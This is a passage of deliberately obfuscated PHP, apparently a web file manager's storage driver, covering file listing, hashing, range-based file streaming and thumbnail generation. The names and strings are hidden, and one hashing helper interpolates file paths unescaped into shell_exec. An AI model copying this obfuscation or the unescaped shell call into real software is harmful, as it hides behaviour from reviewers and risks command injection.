$ÎÌ¥Åâú[] = $°õÃ•æ; $ÚÂÒÂ¡ = $ì³¾ÈÆ[$Îî¼Áõø[86]]; $¿áì¾±µ = $this->pathDriver; if (substr($ì³¾ÈÆ[$Îî¼Áõø[86]], 0, strlen($¿áì¾±µ)) == $¿áì¾±µ) { $ÚÂÒÂ¡ = substr($ÚÂÒÂ¡, strlen($¿áì¾±µ)); } $this->listAllMake($ÚÂÒÂ¡, $ÎÌ¥Åâú); } } public function listAllSimple($ Ğº€Î©, $‚¶Â²Á‚ = false) { $ßÔŸÄ… = $this->listAll($ Ğº€Î©); return $this->listAllSimpleMake($ßÔŸÄ…, $this->getPathOuter($ Ğº€Î©), $‚¶Â²Á‚); } public function listAllSimpleMake($ì˜É¹¯ì, $½Üø¿Ëç, $’ˆõ¥¯¦) { $ì€ÈÂ =& $_SERVER[Î‹ÃÂŞ„]; $Ğ©¢†ÅÛ = array(); $½Üø¿Ëç = rtrim(get_path_father($½Üø¿Ëç), $ì€ÈÂ[8]) . $ì€ÈÂ[8]; foreach ($ì˜É¹¯ì as $±äêäí­) { $ÍÄÏÚ¥Ğ = array($ì€ÈÂ[86] => $±äêäí­[$ì€ÈÂ[86]], $ì€ÈÂ[88] => $±äêäí­[$ì€ÈÂ[86]], $ì€ÈÂ[77] => $±äêäí­[$ì€ÈÂ[77]]); if (isset($±äêäí­[$ì€ÈÂ[78]]) && !$±äêäí­[$ì€ÈÂ[77]]) { $ÍÄÏÚ¥Ğ[$ì€ÈÂ[78]] = $±äêäí­[$ì€ÈÂ[78]]; } if (isset($±äêäí­[$ì€ÈÂ[87]])) { $ÍÄÏÚ¥Ğ[$ì€ÈÂ[87]] = $±äêäí­[$ì€ÈÂ[87]]; } if (is_array($±äêäí­[$ì€ÈÂ[89]])) { $ÍÄÏÚ¥Ğ[$ì€ÈÂ[88]] = $±äêäí­[$ì€ÈÂ[89]][$ì€ÈÂ[86]]; $ÍÄÏÚ¥Ğ[$ì€ÈÂ[78]] = $±äêäí­[$ì€ÈÂ[89]][$ì€ÈÂ[78]]; $ÍÄÏÚ¥Ğ[$ì€ÈÂ[87]] = $±äêäí­[$ì€ÈÂ[89]][$ì€ÈÂ[87]]; } else { if (substr($±äêäí­[$ì€ÈÂ[86]], 0, strlen($½Üø¿Ëç)) == $½Üø¿Ëç) { $ÍÄÏÚ¥Ğ[$ì€ÈÂ[86]] = substr($±äêäí­[$ì€ÈÂ[86]], strlen($½Üø¿Ëç)); } } $ü¼ôœ°› = $±äêäí­[$ì€ÈÂ[77]] ? $ì€ÈÂ[8] : $ì€ÈÂ[12]; $ÍÄÏÚ¥Ğ[$ì€ÈÂ[88]] = rtrim($ÍÄÏÚ¥Ğ[$ì€ÈÂ[88]], $ì€ÈÂ[8]) . $ü¼ôœ°›; $ÍÄÏÚ¥Ğ[$ì€ÈÂ[86]] = $ì€ÈÂ[8] . trim($ÍÄÏÚ¥Ğ[$ì€ÈÂ[86]], $ì€ÈÂ[8]) . $ü¼ôœ°›; if (!$’ˆõ¥¯¦) { $å“ËÚ“Ï = explode($ì€ÈÂ[8], trim($ÍÄÏÚ¥Ğ[$ì€ÈÂ[86]], $ì€ÈÂ[8])); $ÍÄÏÚ¥Ğ[$ì€ÈÂ[86]] = $ì€ÈÂ[8] . implode($ì€ÈÂ[8], array_slice($å“ËÚ“Ï, 1)) . $ü¼ôœ°›; } $Ğ©¢†ÅÛ[] = $ÍÄÏÚ¥Ğ; } return array_sort_by($Ğ©¢†ÅÛ, $ì€ÈÂ[86]); } public function upload($—ıÏĞ¦ó, $¾éˆàÖ, $ÚêÜŞÒ¹ = false, $üğÌ¸¤ƒ = REPEAT_REPLACE) { } public function uploadFileByID($š¾Îè°, $‰Î½ÜÎš, $‹öºı³ª) { } public function uploadFileByPath($È—™Ã„, $Ó÷ƒ æ, $úÊéÍæ = array()) { } public function isUploadServer() { $ÄÀØíİ’ =& $_SERVER[Î‹ÃÂŞ„]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $ÄÀØíİ’[90]) { return !0; } return $GLOBALS[$ÄÀØíİ’[6]][$ÄÀØíİ’[91]][$ÄÀØíİ’[92]]; } public function isFileOutServer() { $×Ş¶¦Î =& $_SERVER[Î‹ÃÂŞ„]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $×Ş¶¦Î[90]) { return !0; } return $GLOBALS[$×Ş¶¦Î[6]][$×Ş¶¦Î[91]][$×Ş¶¦Î[93]]; } public function isCdnHost() { return $this->isFileOutServer() || empty($this->cdnHost) ? !1 : !0; } public function getCdnLink($ğÆ¶äÌì) { $äŞ„Ôôğ =& $_SERVER[Î‹ÃÂŞ„]; if (!$this->isCdnHost()) { return $ğÆ¶äÌì; } return str_replace(trim(get_url_root($ğÆ¶äÌì), $äŞ„Ôôğ[8]), trim($this->cdnHost, $äŞ„Ôôğ[8]), $ğÆ¶äÌì); } public function uploadLink($œøÜÜÕŒ, $úÎŠ«›Ç = 0) { $÷êêÅ½ü =& $_SERVER[Î‹ÃÂŞ„]; if ($this->isUploadServer()) { return; } $ö×‡€”Â = $this->getType(); if (!in_array($ö×‡€”Â, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $Â¹ö§ñä = 1024 * 1024 * 10; $‡™É‰éŸ = $úÎŠ«›Ç <= $Â¹ö§ñä ? $÷êêÅ½ü[94] : $÷êêÅ½ü[95]; $»½¨£„± = (!$úÎŠ«›Ç ? 1 : ceil($úÎŠ«›Ç / pow(1024, 3))) * 3600 * 4; $ëÊø”‰í = $this->{$‡™É‰éŸ}($œøÜÜÕŒ, $»½¨£„±); if ($ëÊø”‰í) { $ëÊø”‰í[$÷êêÅ½ü[96]] = $œøÜÜÕŒ; $ëÊø”‰í[$÷êêÅ½ü[97]] = $ö×‡€”Â; } return $ëÊø”‰í; } public function uploadFormData($òçé¨Ûè, $Éæ’ßŠ = 3600) { } public function multiUploadFormData($âÒğÛËĞ, $‰©ÛğÏ = 3600) { } public function download($éÉã‚¿, $Å…¹„²) { } public function ext($äÙ†ÌÀ”) { $ÓÎÑœ×ô =& $_SERVER[Î‹ÃÂŞ„]; if (strpos($äÙ†ÌÀ”, $ÓÎÑœ×ô[8]) === -1) { $Ùãü‚ = $äÙ†ÌÀ”; } else { $Ùãü‚ = $this->pathThis($äÙ†ÌÀ”); } $øÛÚ²—İ = $ÓÎÑœ×ô[12]; if (strstr($Ùãü‚, $ÓÎÑœ×ô[10])) { $øÛÚ²—İ = substr($Ùãü‚, strrpos($Ùãü‚, $ÓÎÑœ×ô[10]) + 1); $øÛÚ²—İ = strtolower($øÛÚ²—İ); } if (strlen($øÛÚ²—İ) > 3 && preg_match($ÓÎÑœ×ô[98], $øÛÚ²—İ, $İ¾Í©È¥)) { $øÛÚ²—İ = $ÓÎÑœ×ô[12]; } return $øÛÚ²—İ; } public function pathThis($“Ô‡ˆçÖ) { $È¥Á‰ç€ =& $_SERVER[Î‹ÃÂŞ„]; $“Ô‡ˆçÖ = str_replace($È¥Á‰ç€[99], $È¥Á‰ç€[8], rtrim($“Ô‡ˆçÖ, $È¥Á‰ç€[8])); $™Ò¶óÅ‡ = strrpos($“Ô‡ˆçÖ, $È¥Á‰ç€[8]); if ($™Ò¶óÅ‡ === !1) { return $“Ô‡ˆçÖ; } return substr($“Ô‡ˆçÖ, $™Ò¶óÅ‡ + 1); } public function pathFather($ò ™»ƒ½) { $·É¢•³† =& $_SERVER[Î‹ÃÂŞ„]; $ò ™»ƒ½ = str_replace($·É¢•³†[99], $·É¢•³†[8], rtrim($ò ™»ƒ½, $·É¢•³†[8])); $©î¶ôß‹ = strrpos($ò ™»ƒ½, $·É¢•³†[8]); if ($©î¶ôß‹ === !1) { return $·É¢•³†[12]; } return substr($ò ™»ƒ½, 0, $©î¶ôß‹ + 1); } public function hashSimple($ğ½çûùî) { $•µ¹Á§ù =& $_SERVER[Î‹ÃÂŞ„]; if (!$ğ½çûùî) { return md5($•µ¹Á§ù[12]); } $ŞÉÍ†£È = $this->size($ğ½çûùî); $ô“ïÙ¡ = 200; $ƒèŞ™£Ô = 50; if ($ŞÉÍ†£È <= $ô“ïÙ¡ * $ƒèŞ™£Ô) { return $this->hashMd5($ğ½çûùî) . $ŞÉÍ†£È; } $¦¿Ú¿Å¾ = intval($ŞÉÍ†£È / $ƒèŞ™£Ô); $®ä¡Ø†à = $•µ¹Á§ù[12]; for ($úŠàı = 0; $úŠàı < $ƒèŞ™£Ô; $úŠàı++) { $®ä¡Ø†à .= $this->fileSubstr($ğ½çûùî, $¦¿Ú¿Å¾ * $úŠàı, $ô“ïÙ¡); } $®ä¡Ø†à .= $this->fileSubstr($ğ½çûùî, $ŞÉÍ†£È - $ô“ïÙ¡, $ô“ïÙ¡); return md5($®ä¡Ø†à) . $ŞÉÍ†£È; } public static $md5Cache = array(); public function hashMd5($Å¦«ğ§í) { if (!$Å¦«ğ§í) { return md5($_SERVER[Î‹ÃÂŞ„][12]); } $Å¦«ğ§í = $this->iconvSystem($Å¦«ğ§í); if (isset(self::$md5Cache[$Å¦«ğ§í])) { return self::$md5Cache[$Å¦«ğ§í]; } self::$md5Cache[$Å¦«ğ§í] = $this->hashMd5Shell($Å¦«ğ§í); if (!self::$md5Cache[$Å¦«ğ§í]) { self::$md5Cache[$Å¦«ğ§í] = @md5_file($Å¦«ğ§í); } return self::$md5Cache[$Å¦«ğ§í]; } private function hashMd5Shell($¬†´º„Í) { $ÑÇé«·Æ =& $_SERVER[Î‹ÃÂŞ„]; if (!$¬†´º„Í) { return md5($ÑÇé«·Æ[12]); } if (!function_exists($ÑÇé«·Æ[100])) { return !1; } $ãùöÆ = array($ÑÇé«·Æ[101], $ÑÇé«·Æ[102]); $ò®£ï€è = Cache::get($ÑÇé«·Æ[103]); if (!$ò®£ï€è) { $µ†›çª = BASIC_PATH . $ÑÇé«·Æ[104]; $Ó¼×ˆŠ = md5_file($µ†›çª); $ò®£ï€è = $ÑÇé«·Æ[105]; foreach ($ãùöÆ as $ØÄÚ«÷ó) { $’ÙºÄúö = shell_exec($ØÄÚ«÷ó . "\40\x22{$µ†›çª}\x22"); if ($’ÙºÄúö && substr(trim($’ÙºÄúö), 0, 32) == $Ó¼×ˆŠ) { $ò®£ï€è = $ØÄÚ«÷ó; break; } } Cache::set($ÑÇé«·Æ[103], $ò®£ï€è, 3600); } if ($ò®£ï€è == $ÑÇé«·Æ[105]) { return !1; } $’ÙºÄúö = shell_exec($ò®£ï€è . "\40\x22{$¬†´º„Í}\42"); $’ÙºÄúö = str_replace($ÑÇé«·Æ[106], $ÑÇé«·Æ[12], $’ÙºÄúö); return substr($’ÙºÄúö, 0, 32); } public function link($äıöêœ) { return $äıöêœ; } public function fileOut($¯ÉÌ´’‰, $«äöÄ„ = false, $ÈÙ§ëù÷ = false, $‘ˆË¦Õ = '') { $ë¾ƒÀ¶İ =& $_SERVER[Î‹ÃÂŞ„]; $this->cacheMethod(null, null); if (!$¯ÉÌ´’‰ || !$this->exist($¯ÉÌ´’‰)) { show_json(LNG($ë¾ƒÀ¶İ[107]), !1, $ÈÙ§ëù÷); } $€ÛæıÓË = $this->getType() == $ë¾ƒÀ¶İ[108]; $èáóêœè = $GLOBALS[$ë¾ƒÀ¶İ[6]][$ë¾ƒÀ¶İ[91]][$ë¾ƒÀ¶İ[109]][$ë¾ƒÀ¶İ[110]]; $µ¹ÂœÕÕ = (double) $GLOBALS[$ë¾ƒÀ¶İ[6]][$ë¾ƒÀ¶İ[91]][$ë¾ƒÀ¶İ[109]][$ë¾ƒÀ¶İ[111]] * 1024 * 1024; @ob_end_clean(); set_timeout(); $ÓÃÔ±¶ö = $this->infoFull($¯ÉÌ´’‰); $È·‘÷ş² = $ÓÃÔ±¶ö[$ë¾ƒÀ¶İ[78]]; $Ç‡ÏóêÅ = gmdate($ë¾ƒÀ¶İ[112], $ÓÃÔ±¶ö[$ë¾ƒÀ¶İ[87]]); $“¯íœãé = $ÈÙ§ëù÷ ? $ÈÙ§ëù÷ : $this->iconvApp($ÓÃÔ±¶ö[$ë¾ƒÀ¶İ[32]]); $ÄÚ¥Í¨ = 0; $¶ŒÄ—û· = $È·‘÷ş² - 1; $¦îµ”¦ö = $this->ext($“¯íœãé); if (in_array($¦îµ”¦ö, array($ë¾ƒÀ¶İ[113], $ë¾ƒÀ¶İ[114], $ë¾ƒÀ¶İ[115], $ë¾ƒÀ¶İ[116]))) { $¦îµ”¦ö = $ë¾ƒÀ¶İ[117]; } if (in_array($¦îµ”¦ö, array($ë¾ƒÀ¶İ[118]))) { $¦îµ”¦ö = $ë¾ƒÀ¶İ[119]; } if (!$‘ˆË¦Õ) { $‘ˆË¦Õ = md5($Ç‡ÏóêÅ . $È·‘÷ş²); } $‘ˆË¦Õ = $ë¾ƒÀ¶İ[120] . $‘ˆË¦Õ . $ë¾ƒÀ¶İ[120]; $×›üßà„ = get_file_mime($¦îµ”¦ö); $›¾÷ç²Ú = !0; $›¾÷ç²Ú = isset($_GET[$ë¾ƒÀ¶İ[121]]) ? !1 : !0; if ($«äöÄ„ === !1 && !mime_support($×›üßà„)) { $×›üßà„ = $ë¾ƒÀ¶İ[122]; } header($ë¾ƒÀ¶İ[123]); header($ë¾ƒÀ¶İ[124] . $×›üßà„); $“×Ã‚’¢ = rawurlencode($“¯íœãé); $“×Ã‚’¢ = $ë¾ƒÀ¶İ[120] . $“×Ã‚’¢ . $ë¾ƒÀ¶İ[125] . $“×Ã‚’¢; if ($«äöÄ„) { header($ë¾ƒÀ¶İ[126]); header($ë¾ƒÀ¶İ[127] . $“×Ã‚’¢); } else { if ($›¾÷ç²Ú) { header($ë¾ƒÀ¶İ[128] . $“×Ã‚’¢); } } header($ë¾ƒÀ¶İ[129] . gmdate($ë¾ƒÀ¶İ[112], time() + 3600 * 24 * 30) . $ë¾ƒÀ¶İ[130]); header($ë¾ƒÀ¶İ[131]); header($ë¾ƒÀ¶İ[132]); header($ë¾ƒÀ¶İ[133]); if (isset($_SERVER[$ë¾ƒÀ¶İ[134]]) && strtotime($_SERVER[$ë¾ƒÀ¶İ[134]]) == $ÓÃÔ±¶ö[$ë¾ƒÀ¶İ[87]]) { header($ë¾ƒÀ¶İ[135], !0, 304); die; } if (isset($_SERVER[$ë¾ƒÀ¶İ[136]]) && $_SERVER[$ë¾ƒÀ¶İ[136]] == $‘ˆË¦Õ) { header($ë¾ƒÀ¶İ[137] . $‘ˆË¦Õ, !0, 304); die; } header($ë¾ƒÀ¶İ[137] . $‘ˆË¦Õ); header($ë¾ƒÀ¶İ[138] . $Ç‡ÏóêÅ . $ë¾ƒÀ¶İ[130]); header($ë¾ƒÀ¶İ[139] . $“¯íœãé); header($ë¾ƒÀ¶İ[140]); header($ë¾ƒÀ¶İ[141] . $È·‘÷ş²); header($ë¾ƒÀ¶İ[142]); Hook::trigger($ë¾ƒÀ¶İ[143], $¯ÉÌ´’‰, $È·‘÷ş², $“¯íœãé, $¦îµ”¦ö); if (!$«äöÄ„ && $¦îµ”¦ö == $ë¾ƒÀ¶İ[144]) { if ($È·‘÷ş² > 1024 * 1024 * 5) { die; } $¾»áö‡Ÿ = $this->getContent($¯ÉÌ´’‰); $¾»áö‡Ÿ = Html::clearSVG($¾»áö‡Ÿ); header($ë¾ƒÀ¶İ[145] . strlen($¾»áö‡Ÿ)); echo $¾»áö‡Ÿ; die; } $¥¬¡Ü’˜ = strtolower($_SERVER[$ë¾ƒÀ¶İ[146]]); if ($€ÛæıÓË && $¥¬¡Ü’˜ && $èáóêœè) { if (strstr($¥¬¡Ü’˜, $ë¾ƒÀ¶İ[147])) { header($ë¾ƒÀ¶İ[148] . $¯ÉÌ´’‰); } else { if (strstr($¥¬¡Ü’˜, $ë¾ƒÀ¶İ[149])) { header($ë¾ƒÀ¶İ[150] . $¯ÉÌ´’‰); } else { if (strstr($¥¬¡Ü’˜, $ë¾ƒÀ¶İ[151])) { header($ë¾ƒÀ¶İ[152] . $¯ÉÌ´’‰); } } } if ($µ¹ÂœÕÕ) { header($ë¾ƒÀ¶İ[153] . $µ¹ÂœÕÕ); } return; } if (isset($_SERVER[$ë¾ƒÀ¶İ[154]])) { if (preg_match($ë¾ƒÀ¶İ[155], $_SERVER[$ë¾ƒÀ¶İ[154]], $ûóé¡¡†)) { $ÄÚ¥Í¨ = intval($ûóé¡¡†[1]); $ÄÚ¥Í¨ = $ÄÚ¥Í¨ <= 0 ? 0 : ($ÄÚ¥Í¨ >= $¶ŒÄ—û· ? $¶ŒÄ—û· : $ÄÚ¥Í¨); if (!empty($ûóé¡¡†[2])) { $ÓÈ·ÌÖò = intval($ûóé¡¡†[2]); $¶ŒÄ—û· = $ÓÈ·ÌÖò < $ÄÚ¥Í¨ ? $ÄÚ¥Í¨ : ($ÓÈ·ÌÖò >= $¶ŒÄ—û· ? $¶ŒÄ—û· : $ÓÈ·ÌÖò); } } header($ë¾ƒÀ¶İ[156]); header("\x43\157\x6e\164\145\156\x74\x2d\122\141\156\x67\x65\x3a\x20\x62\171\164\x65\x73\x20{$ÄÚ¥Í¨}\x2d{$¶ŒÄ—û·}\57" . $È·‘÷ş²); } else { header($ë¾ƒÀ¶İ[157]); } header($ë¾ƒÀ¶İ[158]); $ıöÁ°½³ = !0; if ($_SERVER[$ë¾ƒÀ¶İ[159]] == $ë¾ƒÀ¶İ[160] && $È·‘÷ş² > 1204 * 1024 * 1024 * 2) { $ıöÁ°½³ = !1; } if ($ıöÁ°½³) { header($ë¾ƒÀ¶İ[161] . ($¶ŒÄ—û· - $ÄÚ¥Í¨ + 1)); } if ($_SERVER[$ë¾ƒÀ¶İ[162]] == $ë¾ƒÀ¶İ[163]) { return; } $¼ò„àò¶ = 1024 * 100; $¾Â¯î Š = 0; if ($µ¹ÂœÕÕ) { $¾Â¯î Š = intval(1000 * 1000 * ($¼ò„àò¶ / $µ¹ÂœÕÕ)); } while ($ÄÚ¥Í¨ <= $¶ŒÄ—û·) { $—ˆû¤… = timeFloat(); check_abort(); $¶ı×‹í÷ = $¶ŒÄ—û· - $ÄÚ¥Í¨ + 1; if ($¶ı×‹í÷ <= $¼ò„àò¶) { $¼ò„àò¶ = $¶ı×‹í÷; } echo $this->fileSubstr($¯ÉÌ´’‰, $ÄÚ¥Í¨, $¼ò„àò¶); $ÄÚ¥Í¨ += $¼ò„àò¶; if ($¼ò„àò¶ == $¶ı×‹í÷) { $ÄÚ¥Í¨ = $¶ŒÄ—û· + 1; } if ($¾Â¯î Š) { $Ïä‘äÒ¤ = intval(1000 * 1000 * (timeFloat() - $—ˆû¤…)); $é‰ò™¨ = $¾Â¯î Š - $Ïä‘äÒ¤; if ($é‰ò™¨ > 5) { usleep($é‰ò™¨); } } } } public function fileOutServer($šğŠÇç, $–áöĞäÛ = false, $ë‘”ÏÈĞ = false, $ß®©õ€ = '') { $this->fileOut($šğŠÇç, $–áöĞäÛ, $ë‘”ÏÈĞ, $ß®©õ€); } public function fileOutLink($®à€ÓÛ¡) { header($_SERVER[Î‹ÃÂŞ„][164] . $®à€ÓÛ¡); die; } public function cacheMethod($åÕêè‚¶, $íóÖàÇ×, $úÄıëÄì = null) { $”¨Ãêáú =& $_SERVER[Î‹ÃÂŞ„]; static $ˆÊÒ÷Ç¡ = array(); $İ÷æÑõ = $íóÖàÇ× ? ltrim($this->getPathOuter($íóÖàÇ×), $”¨Ãêáú[8]) : $”¨Ãêáú[12]; $Ö¿Í»ô­ = $”¨Ãêáú[165] . $åÕêè‚¶ . $”¨Ãêáú[166] . rtrim($İ÷æÑõ, $”¨Ãêáú[8]); if (is_null($åÕêè‚¶)) { $ˆÊÒ÷Ç¡ = array(); return; } if (is_null($íóÖàÇ×)) { foreach ($ˆÊÒ÷Ç¡ as $Ö¿Í»ô­ => $·Ê¥ìˆ›) { if (!strstr($Ö¿Í»ô­, $”¨Ãêáú[165] . $åÕêè‚¶ . $”¨Ãêáú[167])) { continue; } unset($ˆÊÒ÷Ç¡[$Ö¿Í»ô­]); } return; } if (!is_null($úÄıëÄì)) { $ˆÊÒ÷Ç¡[$Ö¿Í»ô­] = $úÄıëÄì; return; } $Éì²¸ÔĞ = isset($ˆÊÒ÷Ç¡[$Ö¿Í»ô­]) ? $ˆÊÒ÷Ç¡[$Ö¿Í»ô­] : null; if (!is_null($Éì²¸ÔĞ)) { return $Éì²¸ÔĞ; } $Éì²¸ÔĞ = $this->{$åÕêè‚¶}($íóÖàÇ×); $ˆÊÒ÷Ç¡[$Ö¿Í»ô­] = $Éì²¸ÔĞ; return $Éì²¸ÔĞ; } public function cacheMethodInfoSet($î°İ›, $Š§¶±á¼, $Œ¦ÓÓû = false) { $“Ø—§³½ =& $_SERVER[Î‹ÃÂŞ„]; if ($this->listItemCache === !1) { return; } $this->cacheMethod($“Ø—§³½[168], $î°İ›, $Š§¶±á¼); $this->cacheMethod($“Ø—§³½[169], $î°İ›, $Š§¶±á¼ ? !1 : !0); if (is_array($Œ¦ÓÓû)) { $this->cacheMethod($“Ø—§³½[170], $î°İ›, $Œ¦ÓÓû); } } public function fileOutImage($ÅÂ‚ùŸÈ, $Ûàúšü” = 250) { $ğ¿©»€À =& $_SERVER[Î‹ÃÂŞ„]; set_timeout(); if (substr($ÅÂ‚ùŸÈ, 0, 4) == $ğ¿©»€À[151]) { $this->fileOutLink($ÅÂ‚ùŸÈ); } $ùÁ˜ôĞõ = $this->info($ÅÂ‚ùŸÈ); $Ø“ìÇÉ˜ = !1; $ôî‚äŒŠ = isset($GLOBALS[$ğ¿©»€À[171]]) ? $GLOBALS[$ğ¿©»€À[171]] : array(); if ($ôî‚äŒŠ && $ôî‚äŒŠ[$ğ¿©»€À[172]] == $ùÁ˜ôĞõ[$ğ¿©»€À[86]]) { $ùÁ˜ôĞõ = $ôî‚äŒŠ; $¥ùÊœ¨‘ = $ùÁ˜ôĞõ[$ğ¿©»€À[173]]; if ($¥ùÊœ¨‘ && isset($¥ùÊœ¨‘[$ğ¿©»€À[174]])) { if ($¥ùÊœ¨‘[$ğ¿©»€À[174]] <= $Ûàúšü” && $¥ùÊœ¨‘[$ğ¿©»€À[175]] <= $Ûàúšü”) { $Ø“ìÇÉ˜ = !0; } } } if ($ùÁ˜ôĞõ[$ğ¿©»€À[78]] <= 1024 * 50 || $Ø“ìÇÉ˜ || !function_exists($ğ¿©»€À[176]) || $ùÁ˜ôĞõ[$ğ¿©»€À[177]] == $ğ¿©»€À[178]) { return $this->fileOut($ÅÂ‚ùŸÈ, !1, $ùÁ˜ôĞõ[$ğ¿©»€À[32]]); } $¦ıËñåÉ = kodIO::hashPath($ùÁ˜ôĞõ); $–ÕÂ†Ö = "\x63\x6f\166\x65\x72\137{$¦ıËñåÉ}\x5f{$Ûàúšü”}\x2e\160\x6e\147"; $Ïå„ˆé  = IO_PATH_SYSTEM_TEMP . $ğ¿©»€À[179]; $ö¯³–€É = IO::infoFullSimple($Ïå„ˆé ); $şí’Ô¡Û = $ö¯³–€É && is_array($ö¯³–€É) ? $ö¯³–€É[$ğ¿©»€À[86]] : $ğ¿©»€À[12]; if (!$şí’Ô¡Û) { $şí’Ô¡Û = IO::mkdir($Ïå„ˆé ); } if ($ùÁ˜ôĞõ[$ğ¿©»€À[180]] == $ğ¿©»€À[181] && isset($ùÁ˜ôĞõ[$ğ¿©»€À[182]]) && $ùÁ˜ôĞõ[$ğ¿©»€À[182]] == kodIO::sourceID($şí’Ô¡Û)) { $·æÑÀ–ì = $ùÁ˜ôĞõ[$ğ¿©»€À[183]]; if ($Ûàúšü” <= 500) { $Å¤íóÕ = preg_replace($ğ¿©»€À[184], $ğ¿©»€À[185], $ùÁ˜ôĞõ[$ğ¿©»€À[32]]); $·æÑÀ–ì = IO::fileNameExist($şí’Ô¡Û, $Å¤íóÕ); } return IO::fileOut(KodIO::make($·æÑÀ–ì), !1, $ùÁ˜ôĞõ[$ğ¿©»€À[32]]); } $…óıìÆ‡ = IO::fileNameExist($şí’Ô¡Û, $–ÕÂ†Ö); if ($…óıìÆ‡) { return IO::fileOut(KodIO::make($…óıìÆ‡), !1, $ùÁ˜ôĞõ[$ğ¿©»€À[32]]); } if ($Ûàúšü” > 1000) { $this->makeImageCover($şí’Ô¡Û, $ÅÂ‚ùŸÈ, $–ÕÂ†Ö, $Ûàúšü”); $this->makeImageCover($şí’Ô¡Û, $ÅÂ‚ùŸÈ, "\x63\157\x76\145\x72\137{$¦ıËñåÉ}\x5f\x32\65\x30\56\x70\156\147", 250); $…óıìÆ‡ = IO::fileNameExist($şí’Ô¡Û, $–ÕÂ†Ö); if ($…óıìÆ‡) { return IO::fileOut(KodIO::make($…óıìÆ‡), !1, $ùÁ˜ôĞõ[$ğ¿©»€À[32]]); } die; } $›ñÂ¿£« = Cache::get($–ÕÂ†Ö); if ($›ñÂ¿£« == $ğ¿©»€À[186] || $›ñÂ¿£« == $ğ¿©»€À[187]) { echo $›ñÂ¿£«; die; } Cache::set($–ÕÂ†Ö, $ğ¿©»€À[187], 60); $ÄÆ–ÒÓŒ = array($şí’Ô¡Û, $ùÁ˜ôĞõ[$ğ¿©»€À[86]], $–ÕÂ†Ö, $Ûàúšü”); $©·ÈËßö = $ğ¿©»€À[188] . $ùÁ˜ôĞõ[$ğ¿©»€À[78]] . $ğ¿©»€À[189] . $–ÕÂ†Ö . $ğ¿©»€À[190] . $ùÁ˜ôĞõ[$ğ¿©»€À[32]] . $ğ¿©»€À[191] . $ùÁ˜ôĞõ[$ğ¿©»€À[86]]; TaskQueue::add($ğ¿©»€À[192], $ÄÆ–ÒÓŒ, $©·ÈËßö, $–ÕÂ†Ö); } public function makeImageCover($¦éÕæƒÈ, $©’«ÒÑš, $†«¡¹§¬, $Æº°çòĞ) { $¼¡Û£©Ü =& $_SERVER[Î‹ÃÂŞ„]; if (IO::fileNameExist($¦éÕæƒÈ, $†«¡¹§¬)) { return $¼¡Û£©Ü[193]; } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } if (!is_dir(TEMP_FILES)) { mk_dir(TEMP_FILES); } $ñŞŒÅÅÀ = DATA_THUMB . $†«¡¹§¬; del_file($ñŞŒÅÅÀ); $úéœß = TEMP_FILES . $†«¡¹§¬; if (!@file_exists($úéœß)) { $úéœß = $this->download($©’«ÒÑš, $úéœß); } if (!@file_exists($úéœß)) { return $¼¡Û£©Ü[194]; } ImageThumb::createThumb($úéœß, $ñŞŒÅÅÀ, $Æº°çòĞ, $Æº°çòĞ * 10); if (@file_exists($ñŞŒÅÅÀ)) { Cache::remove($†«¡¹§¬); return IO::move($ñŞŒÅÅÀ, $¦éÕæƒÈ); } Cache::set($†«¡¹§¬, $¼¡Û£©Ü[186], 600); del_file($ñŞŒÅÅÀ); return $¼¡Û£©Ü[195] . $úéœß . $¼¡Û£©Ü[73]; } public function fileOutImageServer($¸º°¯Ù±, $ıÙóåÈá = 250) { $this->fileOutImage($¸º°¯Ù±, $ıÙóåÈá); } public function fileNameAuto($¶ËÜÀô¯, $Àá¥ğ„, $ûååø¨ = REPEAT_RENAME, $¤®²óêà = false) { $¢Ğô•œ =& $_SERVER[Î‹ÃÂŞ„]; $åÁî«ÜË = $¶ËÜÀô¯ === $¢Ğô•œ[12] ? $Àá¥ğ„ : rtrim($¶ËÜÀô¯, $¢Ğô•œ[8]) . $¢Ğô•œ[8] . $Àá¥ğ„; if ($ûååø¨ == REPEAT_REPLACE || !$this->exist($åÁî«ÜË) || $¤®²óêà && $ûååø¨ != REPEAT_RENAME_FOLDER) { return $Àá¥ğ„; } if ($ûååø¨ == REPEAT_SKIP) { return !1; } $÷•†…è´ = $¢Ğô•œ[10] . get_path_ext($Àá¥ğ„); $÷•†…è´ = $÷•†…è´ == $¢Ğô•œ[10] || $¤®²óêà ? $¢Ğô•œ[12] : $÷•†…è´; $ğêÁèñ× = 1; $´ıÍÛ¦è = substr($Àá¥ğ„, 0, strlen($Àá¥ğ„) - strlen($÷•†…è´)); $—êäå®ì = $´ıÍÛ¦è . "\x28{$ğêÁèñ×}\x29{$÷•†…è´}"; while ($this->exist(rtrim($¶ËÜÀô¯, $¢Ğô•œ[8]) . $¢Ğô•œ[8] . $—êäå®ì)) { $—êäå®ì = $´ıÍÛ¦è . "\50{$ğêÁèñ×}\51{$÷•†…è´}"; $ğêÁèñ×++; } return $—êäå®ì; } private function fileNameAutoList($¶¯‚·ß, $ë÷²£•°, $Úä¿İ¡â = false) { $±‹ñ§°Ñ =& $_SERVER[Î‹ÃÂŞ„]; $°úÙ¸â± = $this->listPath($¶¯‚·ß, !0); $°úÙ¸â± = array_merge($°úÙ¸â±[$±‹ñ§°Ñ[84]], $°úÙ¸â±[$±‹ñ§°Ñ[85]]); $×ï©Ó¬” = array_to_keyvalue($°úÙ¸â±, $±‹ñ§°Ñ[12], $±‹ñ§°Ñ[32]); $–Ú²í÷Ì = $±‹ñ§°Ñ[10] . get_path_ext($ë÷²£•°); $–Ú²í÷Ì = $–Ú²í÷Ì == $±‹ñ§°Ñ[10] || $Úä¿İ¡â ? $±‹ñ§°Ñ[12] : $–Ú²í÷Ì; $¥²ø±ì¿ = substr($ë÷²£•°, 0, strlen($ë÷²£•°) - strlen($–Ú²í÷Ì)); $ª«Œ”ïè = $¥²ø±ì¿ . "\50\x30\51{$–Ú²í÷Ì}"; for ($ùö¾…µõ = 1; $ùö¾…µõ <= count($×ï©Ó¬”) + 1; $ùö¾…µõ++) { $ª«Œ”ïè = $¥²ø±ì¿ . "\50{$ùö¾…µõ}\x29{$–Ú²í÷Ì}"; if (!in_array_not_case($ª«Œ”ïè, $×ï©Ó¬”)) { return $ª«Œ”ïè; } } return $ª«Œ”ïè; } public function listAllFiles($û€üĞ¤±, $Â™†¿ºş) { $Ë•ï˜¹ë =& 